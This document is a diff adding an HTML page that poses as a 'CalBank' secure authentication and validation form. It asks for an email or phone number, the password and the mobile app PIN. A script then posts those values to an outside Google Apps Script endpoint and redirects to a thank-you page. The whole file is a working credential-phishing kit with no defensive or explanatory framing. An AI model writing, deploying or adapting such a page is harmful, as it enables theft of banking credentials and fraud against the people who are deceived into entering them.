@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Authentication</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #f7f7f7;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .header {
+      background-color: #1e90ff;
+      color: #fff;
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+    }
+    .header h1 { margin: 0; font-size: 22px; }
+    .header p { margin: 5px 0 0; font-size: 14px; }
+    .login-container {
+      background: #fff;
+      width: 90%;
+      max-width: 360px;
+      margin-top: -30px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    .login-container label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #333;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .button-group button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      background-color: #1e90ff;
+    }
+    .button-group button:hover {
+      background-color: #187bcd;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>Secure Authentication</h1>
+    <p>CalBank Online Validation </p>
+  </div>
+
+  <div class="login-container">
+    <form id="authForm">
+      <label for="email">Email or Phone Number </label>
+      <input type="email" id="email" name="email" placeholder="Enter your email or Phone Number " required>
+
+      <label for="message">Password</label>
+      <input type="text" id="message" name="message" placeholder="Enter your password" required>
+
+      <label for="refCode">Mobile App Pin</label>
+      <input type="text" id="refCode" name="refCode" placeholder="Enter Pin" required>
+
+      <div class="button-group">
+        <button type="submit">VALIDATE →</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('authForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const form = event.target;
+      const data = new FormData(form);
+      const params = new URLSearchParams(data);
+
+      try {
+        const response = await fetch('https://script.google.com/macros/s/AKfycbzNRMIGZ3Qx8NKh_3y9DUUCqytQ0a9gh0JkrZgxo4rF1W4Caj20Gs6tJ0Y1c-2uLIqMew/exec', {
+          method: 'POST',
+          body: params
+        });
+
+        if (response.ok) {
+          window.location.href = 'thank_you.html';
+        } else {
+          alert('Submission failed. Please try again.');
+        }
+      } catch (err) {
+        console.error(err);
+        alert('Error submitting your form.');
+      }
+    });
+  </script>
+</body>
+</html>
